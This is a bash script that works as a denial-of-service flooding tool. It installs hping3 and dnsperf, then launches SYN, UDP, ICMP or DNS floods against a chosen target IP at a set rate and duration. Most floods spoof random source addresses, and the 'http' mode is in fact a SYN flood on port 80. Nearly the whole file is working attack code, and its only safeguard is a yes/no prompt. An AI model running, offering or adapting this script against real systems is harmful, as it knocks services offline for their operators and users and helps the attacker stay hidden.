#!/bin/bash

# Function to check if a command exists
check_and_install() {
    if ! command -v $1 &> /dev/null; then
        echo "[-] $1 is not installed."
        if [ "$EUID" -ne 0 ]; then
            echo "[-] Run the following command to install it:"
            echo "    sudo apt update && sudo apt install -y $2"
            exit 1
        else
            echo "[+] Installing $1..."
            apt update && apt install -y $2
        fi
    fi
}

# Check for necessary tools
check_and_install hping3 hping3
check_and_install dnsperf dnsperf

if [ "$EUID" -ne 0 ]; then
    echo "[-] Please run as root!"
    exit 1
fi

# Usage function
usage() {
    echo "Usage: $0 -t <attack_type> -i <target_ip> [-p <port>] [-r <rate>] [-d <duration>] [-q <query_file>]"
    echo "  -t  Attack type (tcp, udp, dns, http, ip)"
    echo "  -i  Target IP or domain"
    echo "  -p  Target port (default: 80 for HTTP, 53 for DNS, etc.)"
    echo "  -r  Packet rate (default: 1000 packets/sec)"
    echo "  -d  Duration in seconds (default: 10)"
    echo "  -q  Query file (for DNS attack)"
    exit 1
}

# Default values
PORT=80
RATE=1000
DURATION=10
QUERY_FILE="DNS-flood-example"

# Parse command-line arguments
while getopts "t:i:p:r:d:q:" opt; do
    case $opt in
        t) ATTACK_TYPE=$OPTARG ;;
        i) TARGET_IP=$OPTARG ;;
        p) PORT=$OPTARG ;;
        r) RATE=$OPTARG ;;
        d) DURATION=$OPTARG ;;
        q) QUERY_FILE=$OPTARG ;;
        *) usage ;;
    esac
done

# Validate required parameters
if [ -z "$ATTACK_TYPE" ] || [ -z "$TARGET_IP" ]; then
    usage
fi

read -p "Are you sure you want to proceed with the attack on $TARGET_IP? (yes/no): " CONFIRM
if [ "$CONFIRM" != "yes" ]; then
    echo "Attack aborted."
    exit 1
fi

echo "[+] Starting $ATTACK_TYPE attack on $TARGET_IP (Port: $PORT, Rate: $RATE pps, Duration: $DURATION sec)"

# Execute the selected attack
case $ATTACK_TYPE in
    tcp)
        echo "[+] Launching TCP SYN Flood..."
        hping3 -S --flood --rand-source -p $PORT $TARGET_IP &
        sleep $DURATION
        pkill hping3
        ;;
    
    udp)
        echo "[+] Launching UDP Flood..."
        hping3 --udp --flood --rand-source -p $PORT $TARGET_IP &
        sleep $DURATION
        pkill hping3
        ;;
    
    dns)
        echo "[+] Launching DNS Flood using dnsperf..."
        if [ ! -f "$QUERY_FILE" ]; then
            echo "[-] Query file $QUERY_FILE not found! Create a valid DNS query file."
            exit 1
        fi
        dnsperf -d $QUERY_FILE -s $TARGET_IP -l $DURATION -b 8192 -c 100 -T 20 -q 1000000 -Q 180000
        ;;
    
    http)
        echo "[+] Launching HTTP Flood..."
        hping3 -S --flood --rand-source -p 80 $TARGET_IP &
        sleep $DURATION
        pkill hping3
        ;;
    
    ip)
        echo "[+] Launching IP Flood..."
        hping3 -1 --flood --rand-source $TARGET_IP &
        sleep $DURATION
        pkill hping3
        ;;
    
    *)
        echo "[-] Invalid attack type!"
        usage
        ;;
esac

echo "[+] Attack completed!"
